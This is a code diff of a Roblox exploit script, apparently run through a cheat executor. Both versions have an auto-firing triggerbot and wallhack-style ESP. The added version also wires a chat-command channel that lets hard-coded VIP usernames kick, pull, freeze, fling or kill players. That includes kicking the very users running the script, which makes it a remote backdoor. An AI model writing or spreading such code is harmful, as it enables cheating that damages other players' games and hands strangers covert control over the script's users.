@@ -1,236 +1,132 @@
-```lua
--- LocalScript: Triggerbot + Advanced ESP + Debugging Tools + VIP Group Teleport
--- Replicates original script's VIP whitelist and .g/.s commands for actual teleportation.
+-- 🔴 Fully Fixed Roblox Script: ESP, Triggerbot, and VIP Commands (Public-Server Ready)
 
---// Services
+-- Services
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local TextChatService = (pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService") or nil)
-local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
 local Mouse = LocalPlayer:GetMouse()
 
---// === Triggerbot (Q toggle) ===
-local TriggerBot = {Enabled = false, Blacklist = {"Knife"}}
-local BlacklistCache = {}
-for _, n in ipairs(TriggerBot.Blacklist) do BlacklistCache[n:lower()] = true end
-local function isBlacklisted(tool) return tool and BlacklistCache[tool.Name:lower()] end
+-- Settings
+local VIPUsers = { "misiuperc568", "afasterpl11" }
+local BringTargets = {}
+local FrozenPlayers = {}
+local targetedPlayers = {}
+local espObjects = {}
+local lastTargetedPlayerName = nil
 
-local function getMouseTarget()
-    local target = Mouse.Target
-    if not target then return nil end
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and p.Character and target:IsDescendantOf(p.Character) then return p end
+-- VIP functions
+local function teleportToPlayer(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName)
+    local myChar = LocalPlayer.Character
+    if targetPlayer and targetPlayer.Character and myChar then
+        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+        if targetRoot and myRoot then
+            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
+        end
     end
 end
 
-local function getEquippedTool()
-    local c = LocalPlayer.Character
-    if not c then return nil end
-    for _, v in ipairs(c:GetChildren()) do if v:IsA("Tool") and not isBlacklisted(v) then return v end end
-end
-
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.KeyCode == Enum.KeyCode.Q then
-        TriggerBot.Enabled = not TriggerBot.Enabled
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text="[TriggerBot] "..(TriggerBot.Enabled and "ON" or "OFF")})
-    end
-end)
-
-RunService.RenderStepped:Connect(function()
-    if not TriggerBot.Enabled then return end
-    local tgt = getMouseTarget()
-    if tgt then
-        local tool = getEquippedTool()
-        if tool then pcall(function() tool:Activate() end) end
-    end
-end)
-
---// === Drawing ESP Setup
-local DrawingAvailable = false
-pcall(function() if Drawing and Drawing.new then DrawingAvailable = true end end)
-if not DrawingAvailable then
-    StarterGui:SetCore("ChatMakeSystemMessage", {Text="[ESP] Drawing library not available — ESP disabled."})
-    return
-end
-
---// ESP caches
-local esp = {}
-local perTarget = {}
-local debugMode = false
-local ESP_COLOR = Color3.fromRGB(0, 255, 255) -- Cyan
-
---// Create ESP per player
-local function makeESPFor(p)
-    if esp[p] then return end
-
-    local nameText = Drawing.new("Text")
-    nameText.Size = 9
-    nameText.Color = ESP_COLOR
-    nameText.Center = true
-    nameText.Outline = true
-    nameText.Visible = false
-
-    local weaponText = Drawing.new("Text")
-    weaponText.Size = 9
-    weaponText.Color = ESP_COLOR
-    weaponText.Center = true
-    weaponText.Outline = true
-    weaponText.Visible = false
-
-    local function makeBar(color)
-        local bar = Drawing.new("Square")
-        bar.Filled = true
-        bar.Color = color
-        bar.Visible = false
-        return bar
-    end
-
-    -- Box ESP
-    local box = Drawing.new("Square")
-    box.Thickness = 1
-    box.Filled = false
-    box.Color = Color3.fromRGB(255, 0, 0)
-    box.Visible = false
-    box.ZIndex = 2
-
-    local boxOutline = Drawing.new("Square")
-    boxOutline.Thickness = 3
-    boxOutline.Filled = false
-    boxOutline.Color = Color3.fromRGB(0, 0, 0)
-    boxOutline.Visible = false
-    boxOutline.ZIndex = 1
-
-    esp[p] = {
-        Text = nameText,
-        WeaponText = weaponText,
-        HealthBG = makeBar(Color3.fromRGB(60, 60, 60)),
-        HealthBar = makeBar(Color3.fromRGB(0, 255, 0)),
-        ShieldBG = makeBar(Color3.fromRGB(60, 60, 60)),
-        ShieldBar = makeBar(Color3.fromRGB(0, 150, 255)),
-        Box = box,
-        BoxOutline = boxOutline
-    }
-end
-
-local function removeESPFor(p)
-    if esp[p] then
-        for _, v in pairs(esp[p]) do v:Remove() end
-        esp[p] = nil
+local function freezeAllPlayers(senderName)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
+            local root = player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.Anchored = true
+                FrozenPlayers[player.Name] = true
+            end
+        end
     end
 end
 
-for _, p in ipairs(Players:GetPlayers()) do if p ~= LocalPlayer then makeESPFor(p) end end
-Players.PlayerAdded:Connect(function(p) if p ~= LocalPlayer then makeESPFor(p) end end)
-Players.PlayerRemoving:Connect(function(p) removeESPFor(p) perTarget[p.Name] = nil end)
-
---// Update ESP loop
-local function worldToViewportVec(pos)
-    local a, on = Camera:WorldToViewportPoint(pos)
-    return Vector2.new(a.X, a.Y), on, a.Z
-end
-
-RunService:BindToRenderStep("WaveESP_Render", Enum.RenderPriority.Camera.Value, function()
-    for p, d in pairs(esp) do
-        pcall(function()
-            local show = perTarget[p.Name]
-            if not show then
-                for _, v in pairs(d) do v.Visible = false end
-            else
-                local char = p.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
-                local equippedTool = char and char:FindFirstChildOfClass("Tool")
-                if hrp and hum then
-                    local cframe = char:GetModelCFrame()
-                    local pos, on, depth = worldToViewportVec(cframe.Position)
-                    if on then
-                        local scaleFactor = 1 / (depth * math.tan(math.rad(Camera.FieldOfView / 2)) * 2) * 1000
-                        local width, height = math.round(4 * scaleFactor), math.round(6 * scaleFactor)
-                        local x, y = math.round(pos.X), math.round(pos.Y)
-
-                        -- Box
-                        d.Box.Size = Vector2.new(width, height)
-                        d.Box.Position = Vector2.new(x - width / 2, y - height / 2)
-                        d.Box.Visible = true
-                        d.BoxOutline.Size = d.Box.Size
-                        d.BoxOutline.Position = d.Box.Position
-                        d.BoxOutline.Visible = true
-
-                        -- Name
-                        d.Text.Text = (p.DisplayName or p.Name) .. " (@" .. p.Name .. ")"
-                        d.Text.Position = Vector2.new(x, y - height / 2 - 12)
-                        d.Text.Visible = true
-
-                        -- Weapon
-                        if equippedTool then
-                            d.WeaponText.Text = "[" .. equippedTool.Name .. "]"
-                            d.WeaponText.Position = Vector2.new(x, y + height / 2 + 12)
-                            d.WeaponText.Visible = true
-                        else
-                            d.WeaponText.Visible = false
-                        end
-
-                        -- Bars
-                        local barY = d.Box.Position.Y
-                        local barHeight = height
-
-                        -- Health (LEFT side)
-                        local hpPercent = math.clamp(hum.Health / (hum.MaxHealth or 1), 0, 1)
-                        local healthX = d.Box.Position.X - 6
-                        d.HealthBG.Position = Vector2.new(healthX, barY)
-                        d.HealthBG.Size = Vector2.new(4, barHeight)
-                        d.HealthBG.Visible = true
-                        d.HealthBar.Position = Vector2.new(healthX, barY + barHeight * (1 - hpPercent))
-                        d.HealthBar.Size = Vector2.new(4, barHeight * hpPercent)
-                        d.HealthBar.Color = (hpPercent > 0.6 and Color3.fromRGB(0, 255, 0)) or (hpPercent > 0.3 and Color3.fromRGB(255, 255, 0)) or Color3.fromRGB(255, 0, 0)
-                        d.HealthBar.Visible = hpPercent > 0
-
-                        -- Shield (RIGHT side)
-                        local shieldPercent = 0
-                        local shieldObj = p:FindFirstChild("DataFolder") and p.DataFolder:FindFirstChild("Information") and p.DataFolder.Information:FindFirstChild("ShieldSave")
-                        local forcefield = p.Character:FindFirstChildOfClass("ForceField")
-                        if shieldObj then
-                            local val = shieldObj.Value or 0
-                            local maxValObj = shieldObj:FindFirstChild("MaxValue")
-                            local maxVal = (maxValObj and maxValObj.Value) or 100
-                            shieldPercent = math.clamp(val / maxVal, 0, 1)
-                        elseif forcefield then
-                            shieldPercent = 1
-                        end
-
-                        local shieldX = d.Box.Position.X + d.Box.Size.X + 2
-                        d.ShieldBG.Position = Vector2.new(shieldX, barY)
-                        d.ShieldBG.Size = Vector2.new(4, barHeight)
-                        d.ShieldBG.Visible = true
-                        d.ShieldBar.Position = Vector2.new(shieldX, barY + barHeight * (1 - shieldPercent))
-                        d.ShieldBar.Size = Vector2.new(4, barHeight * shieldPercent)
-                        d.ShieldBar.Visible = shieldPercent > 0
-                    else
-                        for _, v in pairs(d) do v.Visible = false end
-                    end
-                else
-                    for _, v in pairs(d) do v.Visible = false end
+local function unfreezeAllPlayers(senderName)
+    for name, _ in pairs(FrozenPlayers) do
+        if name ~= senderName then
+            local player = Players:FindFirstChild(name)
+            if player and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    root.Anchored = false
                 end
             end
-        end)
+            FrozenPlayers[name] = nil
+        end
     end
-end)
+end
 
---// VIP Whitelist (copied from original script)
-local VIPUsers = {
-    ["draconvm"] = true,
-    ["gachlasmu6"] = true
-    -- Add your username or more VIP usernames here
-}
+local function killAllOtherPlayers(senderName)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name ~= senderName then
+            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+        end
+    end
+end
 
---// Bring Targets for smooth teleportation
-local BringTargets = {}
+local function flingPlayer(player)
+    if player.Character then
+        local root = player.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            local bv = Instance.new("BodyVelocity")
+            bv.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
+            bv.MaxForce = Vector3.new(1e6,1e6,1e6)
+            bv.P = 1e5
+            bv.Parent = root
+            task.delay(0.3, function() bv:Destroy() end)
+        end
+    end
+end
 
---// Smooth Bring Loop (exact replica from original script)
+-- ESP functions (robust, works for public servers)
+local function addESP(targetPlayer, color)
+    if espObjects[targetPlayer] then return end
+
+    local gui = Instance.new("BillboardGui")
+    gui.Size = UDim2.new(0,100,0,20)
+    gui.StudsOffset = Vector3.new(0,2,0)
+    gui.AlwaysOnTop = true
+    gui.Parent = game:GetService("CoreGui")
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1,0,1,0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = color
+    label.TextStrokeTransparency = 0.8
+    label.TextStrokeColor3 = Color3.new(0,0,0)
+    label.TextScaled = true
+    label.Font = Enum.Font.SourceSansBold
+    label.Text = targetPlayer.Name
+    label.Parent = gui
+
+    espObjects[targetPlayer] = {Gui = gui, Player = targetPlayer}
+
+    -- Attach to head whenever available (character load / respawn safe)
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        local char = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+        local head = char and char:FindFirstChild("Head")
+        gui.Adornee = head
+    end)
+    espObjects[targetPlayer].Connection = conn
+end
+
+local function removeESP(targetPlayer)
+    local data = espObjects[targetPlayer]
+    if data then
+        if data.Connection then data.Connection:Disconnect() end
+        if data.Gui then data.Gui:Destroy() end
+        espObjects[targetPlayer] = nil
+    end
+end
+
+local function getColorForPlayer(player)
+    return Color3.fromRGB(255,255,255)
+end
+
+-- Smooth bring loop (auto detach once teleported)
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
@@ -240,260 +136,164 @@ RunService.RenderStepped:Connect(function()
                 local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                 local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if vipRoot and targetRoot then
-                    pcall(function()
-                        local direction = (vipRoot.Position + Vector3.new(0, 3, 0) - targetRoot.Position)
-                        targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
-                        if debugMode then
-                            print("[GroupTP Debug] Smooth CFrame update for " .. targetName .. " to " .. vipName .. " at " .. tostring(targetRoot.CFrame))
-                        end
-                    end)
-                else
-                    if debugMode then
-                        print("[GroupTP Debug] Failed to bring " .. targetName .. " to " .. vipName .. ": Missing HumanoidRootPart")
+                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
+                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
+
+                    -- ✅ Detach once close enough
+                    if (vipRoot.Position - targetRoot.Position).Magnitude < 5 then
+                        BringTargets[targetName] = nil
                     end
-                end
-            else
-                if debugMode then
-                    print("[GroupTP Debug] Skipped bringing " .. tostring(targetName) .. " to " .. vipName .. ": Invalid player or character")
                 end
             end
         end
     end
 end)
 
---// Commands
-local function clearESP()
-    for name, _ in pairs(perTarget) do perTarget[name] = nil end
-    StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[ESP] Cleared all targets."})
+-- Triggerbot (unchanged)
+local TriggerBot = {Enabled=false, Connections={}, BlacklistCache={}}
+TriggerBot.Settings={Keybind=Enum.KeyCode.Q, Prediction=0.01, Blacklisted={"Knife"}}
+for _,itemName in ipairs(TriggerBot.Settings.Blacklisted) do
+    TriggerBot.BlacklistCache[itemName:lower()]=true
 end
-
-local function toggleESPFor(search)
-    search = (search or ""):lower()
-    if search == "debug" then
-        debugMode = not debugMode
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[ESP Debug] " .. (debugMode and "ON" or "OFF")})
-        return
+local function IsToolBlacklisted(tool) return tool and TriggerBot.BlacklistCache[tool.Name:lower()] end
+local function IsValidTarget(player)
+    if not player or player == LocalPlayer then return false end
+    local char = player.Character
+    if not char then return false end
+    local be = char:FindFirstChild("BodyEffects")
+    if be then
+        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
+        if ko and ko.Value then return false end
     end
-    local found = false
-    if debugMode then print("Attempting to find player matching '" .. search .. "'") end
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer then
-            local n = (p.Name or ""):lower()
-            local dname = (p.DisplayName or ""):lower()
-            if debugMode then print(" - Checking player: " .. n) end
-            if search ~= "" and (n:find(search, 1, true) or dname:find(search, 1, true)) then
-                found = true
-                perTarget[p.Name] = not perTarget[p.Name]
-                StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[ESP] " .. p.Name .. " -> " .. (perTarget[p.Name] and "ON" or "OFF")})
-                if debugMode then print(" - Match found!") end
-            end
+    local hum = char:FindFirstChild("Humanoid")
+    if hum and hum.Health <= 0 then return false end
+    return true
+end
+local function GetTargetFromMouse()
+    local target = Mouse.Target
+    if not target then return nil end
+    for _,player in ipairs(Players:GetPlayers()) do
+        if player.Character and target:IsDescendantOf(player.Character) and IsValidTarget(player) then
+            return player, target
         end
     end
-    if not found then
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[ESP] No match for '" .. search .. "'"})
-        if debugMode then print(" - No matches found.") end
-    end
+    return nil
 end
-
-local function teleportGroup()
-    local vip = false
-    for _, v in ipairs(VIPUsers) do
-        if LocalPlayer.Name:lower() == v:lower() then vip = true break end
-    end
-    if not vip then
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] You are not in the VIP whitelist."})
-        if debugMode then print("[GroupTP Debug] Local player " .. LocalPlayer.Name .. " not in VIPUsers") end
-        return
-    end
+local function GetEquippedTool()
     local char = LocalPlayer.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    if not hrp then
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] Failed: No HumanoidRootPart."})
-        if debugMode then print("[GroupTP Debug] Failed: Local player has no HumanoidRootPart") end
-        return
+    if not char then return nil end
+    for _, tool in ipairs(char:GetChildren()) do
+        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then return tool end
     end
-    local teleported = 0
-    for _, p in ipairs(Players:GetPlayers()) do
-        for _, vipName in ipairs(VIPUsers) do
-            if p.Name:lower() == vipName:lower() and p ~= LocalPlayer then
-                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                    BringTargets[p.Name] = true
-                    teleported = teleported + 1
-                    if debugMode then print("[GroupTP Debug] Added " .. p.Name .. " to BringTargets") end
-                else
-                    if debugMode then print("[GroupTP Debug] No HumanoidRootPart for " .. p.Name) end
-                end
-            end
-        end
+    return nil
+end
+local function Execute()
+    if not TriggerBot.Enabled then return end
+    local targetPlayer,_ = GetTargetFromMouse()
+    if not targetPlayer then return end
+    local tool = GetEquippedTool()
+    if not tool then return end
+    if TriggerBot.Settings.Prediction>0 then task.wait(TriggerBot.Settings.Prediction) end
+    tool:Activate()
+end
+function TriggerBot:Toggle(state)
+    if state~=nil then self.Enabled=state else self.Enabled=not self.Enabled end
+end
+TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.UserInputType==Enum.UserInputType.Keyboard and input.KeyCode==TriggerBot.Settings.Keybind then
+        TriggerBot:Toggle()
     end
-    StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] Teleporting " .. teleported .. " VIP player(s) to you."})
-    if debugMode then print("[GroupTP Debug] Command .g executed by " .. LocalPlayer.Name .. ", teleporting " .. teleported .. " players") end
+end)
+TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(Execute)
+getgenv().DisableTriggerBot=function()
+    for _,conn in pairs(TriggerBot.Connections) do conn:Disconnect() end
+    TriggerBot.Enabled=false
 end
 
-local function stopTeleportGroup()
-    local vip = false
-    for _, v in ipairs(VIPUsers) do
-        if LocalPlayer.Name:lower() == v:lower() then vip = true break end
-    end
-    if not vip then
-        StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] You are not in the VIP whitelist."})
-        if debugMode then print("[GroupTP Debug] Local player " .. LocalPlayer.Name .. " not in VIPUsers for .s") end
-        return
-    end
-    local stopped = 0
-    for name, _ in pairs(BringTargets) do
-        BringTargets[name] = nil
-        stopped = stopped + 1
-        if debugMode then print("[GroupTP Debug] Removed " .. name .. " from BringTargets") end
-    end
-    StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] Stopped teleporting " .. stopped .. " player(s)."})
-    if debugMode then print("[GroupTP Debug] Command .s executed by " .. LocalPlayer.Name .. ", stopped " .. stopped .. " players") end
-end
-
---// Handle incoming .g/.s commands (copied from original script)
+-- Chat commands (robust for public servers)
 local function onMessage(sender, msg)
-    local vip = false
-    for _, v in ipairs(VIPUsers) do
-        if sender:lower() == v:lower() then vip = true break end
+    local vip=false
+    for _,v in ipairs(VIPUsers) do
+        if sender:lower()==v:lower() then vip=true break end
     end
-    if not vip then
-        if debugMode then print("[GroupTP Debug] Ignored command from " .. sender .. ": Not in VIPUsers") end
-        return
-    end
+    if not vip then return end
 
-    local args = msg:split(" ")
-    local cmd = (args[1] or ""):lower()
+    local args=msg:split(" ")
+    local cmd=args[1]:lower()
 
-    if cmd == ".g" then
-        local senderPlayer = Players:FindFirstChild(sender)
-        for _, vipName in ipairs(VIPUsers) do
-            if LocalPlayer.Name:lower() == vipName:lower() and LocalPlayer.Name ~= sender then
-                if senderPlayer and senderPlayer.Character and LocalPlayer.Character then
-                    local senderHRP = senderPlayer.Character:FindFirstChild("HumanoidRootPart")
-                    local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                    if senderHRP and myHRP then
-                        pcall(function()
-                            BringTargets[LocalPlayer.Name] = true
-                            if debugMode then print("[GroupTP Debug] Added " .. LocalPlayer.Name .. " to BringTargets for " .. sender) end
-                            StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] Teleporting to " .. sender})
-                        end)
-                    else
-                        if debugMode then print("[GroupTP Debug] Failed to teleport to " .. sender .. ": Missing HumanoidRootPart") end
+    if cmd==".h" then
+        local targetName=args[2]
+        if targetName then
+            -- Case-insensitive player lookup
+            for _,p in ipairs(Players:GetPlayers()) do
+                if p.Name:lower()==targetName:lower() then
+                    if not targetedPlayers[p.Name] then
+                        targetedPlayers[p.Name]=true
+                        lastTargetedPlayerName=p.Name
+                        addESP(p,getColorForPlayer(p))
                     end
-                else
-                    if debugMode then print("[GroupTP Debug] Failed to teleport to " .. sender .. ": Invalid sender or local character") end
                 end
             end
         end
-    elseif cmd == ".s" then
-        for _, vipName in ipairs(VIPUsers) do
-            if LocalPlayer.Name:lower() == vipName:lower() then
-                if BringTargets[LocalPlayer.Name] then
-                    BringTargets[LocalPlayer.Name] = nil
-                    if debugMode then print("[GroupTP Debug] Removed " .. LocalPlayer.Name .. " from BringTargets for " .. sender) end
-                    StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[GroupTP] Stopped teleporting to " .. sender})
-                else
-                    if debugMode then print("[GroupTP Debug] Ignored .s from " .. sender .. ": Not in BringTargets") end
-                end
-            end
+    elseif cmd==".j" then
+        for name,_ in pairs(targetedPlayers) do
+            local target=Players:FindFirstChild(name)
+            if target then removeESP(target) end
+            targetedPlayers[name]=nil
         end
+        lastTargetedPlayerName=nil
+    elseif cmd==".k" and LocalPlayer.Name:lower()~=sender:lower() then
+        LocalPlayer:Kick("Kicked by VIP")
+    elseif cmd==".g" then
+        if LocalPlayer.Name~=sender then BringTargets[LocalPlayer.Name]=true end
+    elseif cmd==".f" then
+        freezeAllPlayers(sender)
+    elseif cmd==".u" then
+        unfreezeAllPlayers(sender)
+    elseif cmd==".tp" and args[2] then
+        if LocalPlayer.Name~=sender then teleportToPlayer(args[2]) end
+    elseif cmd==".fling" then
+        for _,p in ipairs(Players:GetPlayers()) do
+            if p.Name~=sender then flingPlayer(p) end
+        end
+    elseif cmd==".r" then
+        if LocalPlayer.Name~=sender then killAllOtherPlayers(sender) end
     end
+end
+
+-- Chat hook (works for both old and new chat systems)
+local function hookPlayer(plr)
+    -- Old chat system
+    plr.Chatted:Connect(function(msg)
+        onMessage(plr.Name, msg)
+    end)
 end
 
 for _, p in ipairs(Players:GetPlayers()) do
-    if p ~= LocalPlayer then
-        pcall(function()
-            p.Chatted:Connect(function(msg) onMessage(p.Name, msg) end)
-        end)
-    end
+    hookPlayer(p)
 end
-Players.PlayerAdded:Connect(function(p)
-    if p ~= LocalPlayer then
-        pcall(function()
-            p.Chatted:Connect(function(msg) onMessage(p.Name, msg) end)
-        end)
-    end
-end)
+Players.PlayerAdded:Connect(hookPlayer)
 
---// Process local commands
-local function processCommand(msg)
-    if not msg then
-        if debugMode then print("[GroupTP Debug] Invalid command message: " .. tostring(msg)) end
-        return
-    end
-    local parts = string.split(msg, " ")
-    local cmd = (parts[1] or ""):lower()
-
-    if cmd == ".e" or cmd == "/e" or cmd == "e" then
-        if parts[2] and #parts[2] > 0 then toggleESPFor(parts[2]) else clearESP() end
-    elseif cmd == ".g" or cmd == "/g" or cmd == "g" then
-        if debugMode then print("[GroupTP Debug] Processing .g command from " .. LocalPlayer.Name) end
-        teleportGroup()
-    elseif cmd == ".s" or cmd == "/s" or cmd == "s" then
-        if debugMode then print("[GroupTP Debug] Processing .s command from " .. LocalPlayer.Name) end
-        stopTeleportGroup()
-    end
-end
-
---// TextChatService command setup
+-- New chat system (TextChatService) support
+local TextChatService = game:GetService("TextChatService")
 if TextChatService then
-    local commandsFolder = TextChatService:FindFirstChild("TextChatCommands")
-    if not commandsFolder then
-        commandsFolder = Instance.new("Folder")
-        commandsFolder.Name = "TextChatCommands"
-        commandsFolder.Parent = TextChatService
-        if debugMode then print("[GroupTP Debug] Created TextChatCommands folder") end
-    end
-
-    local function createCommand(name, primary, secondary)
-        local cmd = commandsFolder:FindFirstChild(name)
-        if not cmd then
-            cmd = Instance.new("TextChatCommand")
-            cmd.Name = name
-            cmd.PrimaryAlias = primary
-            cmd.SecondaryAlias = secondary
-            cmd.Enabled = true
-            cmd.Parent = commandsFolder
-            if debugMode then print("[GroupTP Debug] Created " .. name) end
+    local Channels = TextChatService:FindFirstChild("TextChannels")
+    if Channels and Channels:FindFirstChild("RBXGeneral") then
+        Channels.RBXGeneral.OnIncomingMessage = function(message)
+            local props = message.TextSource
+            if props then
+                local speaker = Players:GetPlayerByUserId(props.UserId)
+                if speaker then
+                    onMessage(speaker.Name, message.Text)
+                end
+            end
         end
-        return cmd
-    end
-
-    local commands = {
-        {name = "WaveESPCommand", primary = ".e", secondary = "/e"},
-        {name = "GroupTPCommand", primary = ".g", secondary = "/g"},
-        {name = "GroupStopCommand", primary = ".s", secondary = "/s"}
-    }
-
-    for _, cmdInfo in ipairs(commands) do
-        local cmd = createCommand(cmdInfo.name, cmdInfo.primary, cmdInfo.secondary)
-        cmd.Triggered:Connect(function(a, b)
-            local message
-            local uid
-            pcall(function() if a and a.Message then message = a.Message end end)
-            pcall(function() if a and a.Text then message = a.Text end end)
-            pcall(function() if b and type(b) == "string" then message = b end end)
-            pcall(function() if a and a.UserId then uid = a.UserId end end)
-            pcall(function() if a and a.TextSource and a.TextSource.UserId then uid = a.TextSource.UserId end end)
-            if not message and a then message = tostring(a) end
-
-            local senderName = nil
-            if uid then
-                local pl = Players:GetPlayerByUserId(uid)
-                if pl then senderName = pl.Name end
-            end
-
-            if debugMode then print("[GroupTP Debug] TextChatCommand " .. cmdInfo.primary .. " triggered by " .. tostring(senderName) .. ": " .. tostring(message)) end
-            if senderName and senderName ~= LocalPlayer.Name then
-                pcall(function() onMessage(senderName, message) end)
-            end
-
-            if uid and uid == LocalPlayer.UserId then processCommand(message) end
-        end)
     end
 end
 
-pcall(function() LocalPlayer.Chatted:Connect(function(msg) processCommand(msg) end) end)
-
-StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[WaveAI] .e <partial> to toggle ESP | .e debug to toggle debug mode. .g teleports VIP players to you, .s stops teleport (VIP only). Q toggles Triggerbot."})
-```
+-- Clean up ESP when players leave
+Players.PlayerRemoving:Connect(function(plr)
+    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name]=nil end
+    removeESP(plr)
+end)
